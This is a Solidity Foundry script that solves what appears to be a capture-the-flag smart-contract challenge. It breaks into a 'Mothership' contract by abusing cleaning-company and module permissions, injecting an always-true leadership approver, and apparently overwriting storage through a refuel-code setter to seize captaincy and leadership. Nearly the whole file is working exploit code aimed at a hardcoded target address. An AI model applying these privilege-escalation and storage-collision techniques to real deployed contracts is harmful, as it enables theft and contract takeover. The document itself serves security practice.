// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IMothership {
    function addSpaceShipToFleet(address spaceship) external;

    function assignNewCaptainToShip(address _newCaptain) external;

    function captainRegisteredShip(address) external view returns (address);

    function fleet(uint256) external view returns (address);

    function fleetLength() external view returns (uint256);

    function hack() external;

    function hacked() external view returns (bool);

    function leader() external view returns (address);

    function promoteToLeader(address _leader) external;
}

interface ISpaceship {
    function captain() external view returns (address);
    function newCaptainPromoted(address _captain) external;
    function askForNewCaptain(address _newCaptain) external;
    function addModule(bytes4 _moduleSig, address _moduleAddress) external;
}

interface ICleaningModule {
    function replaceCleaningCompany(address _cleaningCompany) external;
}
interface IRefuelModule {
    function addAlternativeRefuelStationsCodes(uint256 refuelStationCode) external;
}

contract LeadershipModule {
    function isLeaderApproved(address) external pure returns (bool) {
        return true;
    }
}

contract HackMothership {
    function saveMotherEarth(IMothership ship) external {
        LeadershipModule leadershipModule = new LeadershipModule();
        for(uint8 i; i < ship.fleetLength(); i++) {
            ISpaceship spaceship = ISpaceship(ship.fleet(i));
            ICleaningModule(address(spaceship)).replaceCleaningCompany(address(this));
            spaceship.addModule(LeadershipModule.isLeaderApproved.selector, address(leadershipModule));
            if(i == 0) {
                ICleaningModule(address(spaceship)).replaceCleaningCompany(address(0));
                IRefuelModule(address(spaceship)).addAlternativeRefuelStationsCodes(uint160(address(this)));

                spaceship.askForNewCaptain(address(this));
            }
        }
        ship.promoteToLeader(address(this));
        ship.hack();
        require(ship.hacked());
    }
}
contract MothershipScript is Script {
    IMothership ship;
    address player = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
    function setUp() public {
        ship = IMothership(0xca1c7A37Dfbf270C58AEBCe75dD392AA6BE30088);
    }
    function run() public {
        attack();
    }
    function attack() public {
        vm.startBroadcast(player);
        // vm.startPrank(player, player);
        HackMothership hackMothership = new HackMothership();
        hackMothership.saveMotherEarth(ship);
    }
}
